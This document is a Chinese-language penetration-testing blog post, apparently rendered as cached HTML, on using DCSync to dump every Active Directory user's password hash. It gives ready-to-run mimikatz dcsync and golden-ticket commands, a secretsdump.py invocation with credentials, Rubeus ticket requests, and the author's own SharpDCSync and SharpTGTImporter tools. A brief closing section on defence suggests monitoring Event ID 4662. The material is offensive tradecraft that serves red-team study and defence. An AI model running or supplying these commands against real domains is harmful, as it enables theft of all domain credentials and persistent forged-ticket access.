@@ -1,0 +1,228 @@
+I"�<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">《域渗透——DCSync》</a>曾系统的整理过DCSync的利用方法，本文将要针对利用DCSync导出域内所有用户hash这一方法进行详细介绍，分析不同环境下的利用思路，给出防御建议。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>利用条件</li>
+  <li>利用工具</li>
+  <li>利用思路</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-利用条件">0x02 利用条件</h2>
+<hr />
+
+<p>获得以下任一用户的权限：</p>
+
+<ul>
+  <li>Administrators组内的用户</li>
+  <li>Domain Admins组内的用户</li>
+  <li>Enterprise Admins组内的用户</li>
+  <li>域控制器的计算机帐户</li>
+</ul>
+
+<h2 id="0x03-利用工具">0x03 利用工具</h2>
+<hr />
+
+<h3 id="1c实现mimikatz">1.C实现(<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>)</h3>
+
+<p>实现代码：</p>
+
+<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</p>
+
+<p>示例命令：</p>
+
+<h4 id="1导出域内所有用户的hash">(1)导出域内所有用户的hash</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<h4 id="2导出域内administrator帐户的hash">(2)导出域内administrator帐户的hash</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
+</code></pre></div></div>
+
+<h3 id="2python实现secretsdumppy">2.Python实现(<a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py">secretsdump.py</a>)</h3>
+
+<p>示例命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1
+</code></pre></div></div>
+
+<h3 id="3powershell实现makemeenterpriseadmin">3.Powershell实现(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)</h3>
+
+<p>核心代码使用C Sharp实现，支持以下三个功能：</p>
+
+<ul>
+  <li>通过DCSync导出krbtgt用户的hash</li>
+  <li>使用krbtgt用户的hash生成Golden ticket</li>
+  <li>导入Golden ticket</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>我在测试环境下实验结果显示，生成Golden ticket的功能存在bug，导入Golden ticket后无法获得对应的权限</p>
+
+<h3 id="4c-sharp实现">4.C Sharp实现</h3>
+
+<p>我在(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)的基础上做了以下修改：</p>
+
+<ul>
+  <li>支持导出所有用户hash</li>
+  <li>导出域sid</li>
+  <li>导出所有域用户sid</li>
+</ul>
+
+<p>代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs</p>
+
+<h4 id="补充代码开发细节">补充：代码开发细节</h4>
+
+<p>输出Dictionary中所有的键和值：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach(string key in values.Keys)
+{
+    Console.WriteLine(string.Format("key:{0} value{1}", key, values[key]));
+}
+</code></pre></div></div>
+
+<p>byte数组转string，用来输出hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] data = values["ATT_UNICODE_PWD"] as byte[];
+Console.WriteLine(BitConverter.ToString(data).Replace("-",""));
+</code></pre></div></div>
+
+<p>string转byte数组，用来将hash转换成byte数组：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>string hex = "D4FE97B4FD50367C7AE8FEF781F27A2E";
+var inputByteArray = new byte[hex.Length / 2];
+for (var x = 0; x &lt; inputByteArray.Length; x++)
+{
+    var i = Convert.ToInt32(hex.Substring(x * 2, 2), 16);
+    inputByteArray[x] = (byte)i;
+}
+</code></pre></div></div>
+
+<h2 id="0x04-利用思路">0x04 利用思路</h2>
+<hr />
+
+<h3 id="1在域控制器上执行">1.在域控制器上执行</h3>
+
+<p>0x03中提到的工具均可以</p>
+
+<h3 id="2在域内主机上执行">2.在域内主机上执行</h3>
+
+<h4 id="1mimikatz">(1)Mimikatz</h4>
+
+<p>有以下两种利用思路：</p>
+
+<ul>
+  <li>导入票据，执行DCSync</li>
+  <li>利用Over pass the hash启动脚本，脚本执行DCSync</li>
+</ul>
+
+<h4 id="2secretsdumppy">(2)secretsdump.py</h4>
+
+<p>直接执行即可</p>
+
+<h4 id="3c-sharp实现">(3)C Sharp实现</h4>
+
+<p>首先需要生成票据</p>
+
+<p>有以下两种利用思路：</p>
+
+<ol>
+  <li>拿到krbtgt用户的hash，在本地使用Mimikatz生成Golden ticket</li>
+</ol>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz "kerberos::golden /user:Administrator /domain:TEST.COM /sid:S-1-5-21-254706111-4049838133-2416123456 /krbtgt:D4FE97B4FD50367C7AE8FEF781F27A2E /ticket:test.kirbi"
+</code></pre></div></div>
+
+<ol>
+  <li>拿到高权限用户，使用<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>发送请求获得ticket</li>
+</ol>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /user:administrator /password:123456 /outfile:test.kirbi
+Rubeus.exe asktgt /user:administrator /rc4:D4FE97B4FD50367C7AE8FEF781F27A2E /outfile:test.kirbi
+</code></pre></div></div>
+
+<p>接着导入票据</p>
+
+<p>可以选择SharpTGTImporter.cs，代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs</p>
+
+<p>我在(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)的基础上做了以下修改：</p>
+
+<ul>
+  <li>支持导入指定票据文件</li>
+</ul>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpTGTImporter.exe test.kirbi
+</code></pre></div></div>
+
+<p>最后执行DCSync</p>
+
+<p>导出所有用户hash可以选择SharpDCSync.cs，代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs</p>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpDCSync.exe dc1.test.com TEST.COM
+</code></pre></div></div>
+
+<p>导出krbtgt用户hash可以选择SharpDCSync_krbtgt.cs，代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync_krbtgt.cs</p>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpDCSync_krbtgt.exe dc1.test.com TEST.COM
+</code></pre></div></div>
+
+<h3 id="3在域外主机上执行">3.在域外主机上执行</h3>
+
+<p>方法同“2.在域内主机上执行”</p>
+
+<h2 id="0x05-防御建议">0x05 防御建议</h2>
+<hr />
+
+<p>攻击者需要以下任一用户的权限：</p>
+
+<ul>
+  <li>Administrators组内的用户</li>
+  <li>Domain Admins组内的用户</li>
+  <li>Enterprise Admins组内的用户</li>
+  <li>域控制器的计算机帐户</li>
+</ul>
+
+<p>通过事件日志检测可以选择监控日志Event ID 4662</p>
+
+<p>参考资料：</p>
+
+<p>https://www.blacklanternsecurity.com/2020-12-04-DCSync/</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文介绍了利用DCSync导出域内所有用户hash的方法，在(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)的基础上编写代码SharpTGTImporter.cs和SharpDCSync.cs，便于利用，结合利用思路，给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
